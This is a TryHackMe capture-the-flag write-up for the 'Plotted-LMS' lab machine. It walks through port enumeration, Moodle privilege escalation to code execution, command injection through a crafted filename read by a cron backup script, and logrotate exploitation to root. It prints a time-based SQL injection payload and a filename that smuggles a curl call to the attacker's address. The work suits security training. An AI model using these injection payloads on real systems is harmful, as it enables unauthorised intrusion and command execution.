---
title: Plotted-LMS -- Writeup
date: 2022-04-26
categories: [TryHackMe, Hard]
tags: [tryhackme, ctf, moodle, cron, logrotten]     # TAG names should always be lowercase
img_path: /assets/img/tryhackme/plotted-lms/
---

# Summary -
Hard rated TryHackMe machine containing several rabbit holes(Rickrolls) and a vulnerable or let's say badly configured moodle server which can be used to gain initial access. After then for privilege escalation we have to abuse cronjob executing a certain python script and then logrotten thingy(which is also running kinda like cronjob). Overall, its a fun and well made room.

# Enumeration -
Nmap, here we go...
### nmap -
```bash
# Nmap 7.92 scan initiated Sat Apr 23 05:05:53 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.151.133
Nmap scan report for 10.10.151.133
Host is up (0.14s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:af:92:c1:f0:9f:8a:18:62:8d:bf:ba:c4:58:8d:52 (RSA)
|   256 03:ca:42:df:ef:4b:3e:e6:91:0e:b2:bc:b4:42:1e:d1 (ECDSA)
|_  256 f1:ed:8a:8d:e4:87:d8:c7:69:c1:ca:2b:a4:dc:0c:dc (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
873/tcp  open  http    Apache httpd 2.4.52 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.52 (Debian)
8820/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
9020/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/23%OT=22%CT=1%CU=37643%PV=Y%DS=2%DC=T%G=Y%TM=6263C2A
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   137.08 ms 10.11.0.1
2   137.35 ms 10.10.151.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 23 05:11:08 2022 -- 1 IP address (1 host up) scanned in 315.62 seconds
```

Uh... A lot of http servers. Sigh... Dirbust here we go...

##### port 80 -
Nothing much of interest here.

##### port 873 -
Found a hidden online rail management system on this web server at /rail directory. And it is vulnearable to SQLi but no luck so far escalation it.

```sql
1') AND (SELECT 9635 FROM (SELECT(SLEEP(5)))BtqU) AND ('alGi'='alGi
```

![](Pasted image 20220423155331.png)

![](Pasted image 20220423155351.png)

##### port 8820 -

Found learning management system at /learn.

![](Pasted image 20220423155530.png)

![](Pasted image 20220423205824.png)



##### port 9920 -

Found moodle running at /moodle which is interesting. Maybe this is the way. Let's see... :D

![](Pasted image 20220423155645.png)

While registering, it is saying only email address with certain domains are allowed. So, create account with certain domain.

![](Pasted image 20220423155901.png))

To grab moodle version, we can use moodlescan.

![](Pasted image 20220423160526.png)

And its Moodle v3.9.0-beta

# Exploitation -

After logging in, we can see that we can enroll as a teacher. Well, that's a good sign. Iirc there was a certain moodle exploit to escalate privilege to manager and then get rce. So, let's search.

![](Pasted image 20220425203630.png)

[https://book.hacktricks.xyz/pentesting/pentesting-web/moodle](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle) - I always go to this site if I found something unfamiliar.

[https://www.youtube.com/watch?v=BkEInFI4oIU](https://www.youtube.com/watch?v=BkEInFI4oIU) - this video shows the poc nicely.

![](Pasted image 20220423163134.png)
![](Pasted image 20220425203911.png)

And with that, we can now try to exploit it.

![](Pasted image 20220423191903.png)

# Post Exploitation -
### www-data to plot_admin -

![](Pasted image 20220423192806.png)

moodle_user:<redacted> (Don't worry this creds doesn't matter...)

![](Pasted image 20220423203441.png)

Tried both but didn't work...

![](Pasted image 20220423203507.png)
_Above crontab linpeas output will come in handy in a later time... :D_

![](Pasted image 20220423203609.png)

![](Pasted image 20220423205939.png)

Ffs... Damn this box...

```python
import os

moodle_location = "/var/www/uploadedfiles/filedir/"
backup_location = "/home/plot_admin/.moodle_backup/"

os.system("/usr/bin/rm -rf " + backup_location + "*")

for (root,dirs,files) in os.walk(moodle_location):
        for file in files:
                os.system('/usr/bin/cp "' + root + '/' + file + '" ' + backup_location)
```

So, its probably this script... Sigh... (Remember the crontab output from linpeas?)

Let's analyse it.

So yeah, I know I'm bad at coding so had to do a lot of testing and stuff...

First, I grabbed backup.py on my local machine and played with it until I manage to exploit it.

We cannot do anything about the first os.system call but can abuse the second one.

```bash
" || curl 10.11.49.212 "
```

If we create a filed named like above and run the script we can see the connection approaching to our server.

![](Pasted image 20220424124719.png)

Okay, so next part is pretty tough as well.

Since, we know backup.py is executed by plot_admin as a cron job after some time we need to abuse that but how?

Okay, I lied it wasn't that hard, I just had trouble thinking about it. I used python3 one liner reverse shell and created a file just like our last curl file. Hopefully, will get a shell now.

**P.S. To avoid shell escaping, just create a python revshell using gui file manages and then use terminal to list it and grab the name. Ezpz eh?**

![](Pasted image 20220424125024.png)

And finally!!! Its been 84 years... XD

### plot_admin to root -
Hmm.. A logrotate.timer but its empty when opened.
![](Pasted image 20220424161419.png)

There was a rsync cronjob running as root as well. Let's use pspy to get more info...

![](Pasted image 20220425171611.png)

Hmm... Interesting...
[https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation](https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation)

![](Pasted image 20220425201939.png)

Exploit is kinda funky, may or may not work the first time or several or maybe you will need to reset a machine. So, don't give up... o7

![](Pasted image 20220425202000.png)
_Finally root..._